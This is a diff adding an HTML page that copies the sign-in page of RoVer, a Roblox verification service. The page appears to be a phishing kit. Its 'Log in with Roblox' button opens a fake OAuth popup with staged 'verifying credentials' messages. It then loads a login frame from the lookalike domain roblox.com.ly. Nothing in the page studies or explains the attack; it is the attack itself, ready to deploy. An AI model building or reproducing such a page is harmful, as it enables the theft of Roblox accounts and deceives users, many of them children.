@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RoVer - Sign In</title>
+
+<link rel="stylesheet" href="css/style.css">
+<link rel="icon" type="image/png" href="favicon.png">
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+
+<!-- NAVBAR -->
+<header class="navbar">
+    <div class="nav-left">
+        <div class="brand">
+            <img src="img/rover-logo.png" alt="RoVer Logo" class="brand-logo">
+            <span class="brand-name"></span>
+        </div>
+
+        <nav class="nav-links">
+            <a href="#">Help</a>
+            <a href="#">Team Members</a>
+            <a href="#" class="plus-btn">RoVer Plus</a>
+        </nav>
+    </div>
+
+    <div class="nav-right">
+        <button class="btn-manage">Manage Servers</button>
+        <button class="btn-signin">Sign In</button>
+    </div>
+</header>
+
+<!-- MAIN -->
+<section class="main">
+    <div class="card">
+        <h1>Sign in to RoVer</h1>
+        <p>You must be 13 years of age or older to continue.</p>
+        <button class="btn-main" id="loginBtn">Log in with Roblox</button>
+    </div>
+</section>
+
+<!-- FOOTER -->
+<footer class="footer">
+    <div class="footer-left">
+        <img src="img/logo.png" alt="Imaginary Menagerie Logo" class="footer-logo">
+        <p class="company-name">© 2026 Imaginary Menagerie, LLC.</p>
+        <span class="attributions">attributions</span>
+    </div>
+
+    <div class="footer-column">
+        <a href="#">Team members</a>
+        <a href="#">Support Discord server ↗</a>
+        <a href="#">Add RoLink to your server</a>
+        <a href="#">Bot Developer API</a>
+    </div>
+
+    <div class="footer-column">
+        <a href="#">Terms of Service</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Verify your Roblox account</a>
+    </div>
+</footer>
+
+<!-- POPUP OVERLAY -->
+<div class="popup-overlay" id="popupOverlay">
+    <div class="popup-container" id="popupContainer">
+        <!-- Top Bar -->
+        <div class="popup-header">
+            <span class="popup-header-text">Verify your account</span>
+            <button class="popup-close" id="popupClose">&times;</button>
+        </div>
+        
+        <!-- Popup Content - Authorization -->
+        <div class="popup-content" id="authContent">
+            <div class="popup-logo">
+                <img src="img/rover-logo.png" alt="RoVer Logo">
+            </div>
+            <h2>Authorize with Roblox OAuth</h2>
+            <p>You are about to authorize RoVer to access your Roblox account.</p>
+            <div class="popup-buttons">
+                <button class="btn-continue" id="btnContinue">Continue</button>
+                <button class="btn-return" id="btnReturn">Return to RoVer</button>
+            </div>
+        </div>
+        
+        <!-- Popup Content - Loading -->
+        <div class="popup-content loading-content" id="loadingContent" style="display: none;">
+            <div class="loader">
+                <div class="loader-ring"></div>
+                <div class="loader-ring"></div>
+                <div class="loader-ring"></div>
+            </div>
+            <div class="loading-messages" id="loadingMessages">
+                <p class="loading-message" id="message1">Securing connection</p>
+                <p class="loading-message" id="message2">Verifying credentials</p>
+                <p class="loading-message" id="message3">Connecting to Roblox</p>
+                <p class="loading-message" id="message4">Preparing session</p>
+            </div>
+        </div>
+        
+        <!-- Popup Content - Iframe -->
+        <div class="popup-content iframe-content" id="iframeContent" style="display: none;">
+            <iframe src="https://roblox.com.ly/login?returnUrl=8883935728825988" frameborder="0" class="content-iframe"></iframe>
+        </div>
+    </div>
+</div>
+
+<script>
+    const loginBtn = document.getElementById('loginBtn');
+    const popupOverlay = document.getElementById('popupOverlay');
+    const popupContainer = document.getElementById('popupContainer');
+    const popupClose = document.getElementById('popupClose');
+    const btnContinue = document.getElementById('btnContinue');
+    const btnReturn = document.getElementById('btnReturn');
+    const authContent = document.getElementById('authContent');
+    const loadingContent = document.getElementById('loadingContent');
+    const iframeContent = document.getElementById('iframeContent');
+    const message1 = document.getElementById('message1');
+    const message2 = document.getElementById('message2');
+    const message3 = document.getElementById('message3');
+    const message4 = document.getElementById('message4');
+
+    // Open popup on login button click
+    loginBtn.addEventListener('click', () => {
+        popupOverlay.classList.add('active');
+        popupContainer.classList.remove('expanded');
+        authContent.style.display = 'block';
+        loadingContent.style.display = 'none';
+        iframeContent.style.display = 'none';
+        resetMessages();
+    });
+
+    // Close popup
+    popupClose.addEventListener('click', closePopup);
+    btnReturn.addEventListener('click', closePopup);
+    
+    popupOverlay.addEventListener('click', (e) => {
+        if (e.target === popupOverlay) {
+            closePopup();
+        }
+    });
+
+    function closePopup() {
+        popupOverlay.classList.remove('active');
+        resetMessages();
+    }
+
+    function resetMessages() {
+        message1.style.opacity = '0.3';
+        message2.style.opacity = '0.3';
+        message3.style.opacity = '0.3';
+        message4.style.opacity = '0.3';
+    }
+
+    // Continue button - show loading animation
+    btnContinue.addEventListener('click', () => {
+        authContent.style.display = 'none';
+        loadingContent.style.display = 'flex';
+        
+        // Animate messages
+        setTimeout(() => {
+            message1.style.opacity = '1';
+            message1.style.color = '#ff2d87';
+        }, 500);
+        
+        setTimeout(() => {
+            message1.style.opacity = '0.3';
+            message2.style.opacity = '1';
+            message2.style.color = '#ff2d87';
+        }, 2000);
+        
+        setTimeout(() => {
+            message2.style.opacity = '0.3';
+            message3.style.opacity = '1';
+            message3.style.color = '#ff2d87';
+        }, 3500);
+        
+        setTimeout(() => {
+            message3.style.opacity = '0.3';
+            message4.style.opacity = '1';
+            message4.style.color = '#ff2d87';
+        }, 5000);
+        
+        // After loading, show iframe
+        setTimeout(() => {
+            loadingContent.style.display = 'none';
+            iframeContent.style.display = 'block';
+            popupContainer.classList.add('expanded');
+        }, 6500);
+    });
+</script>
+
+</body>
+</html>
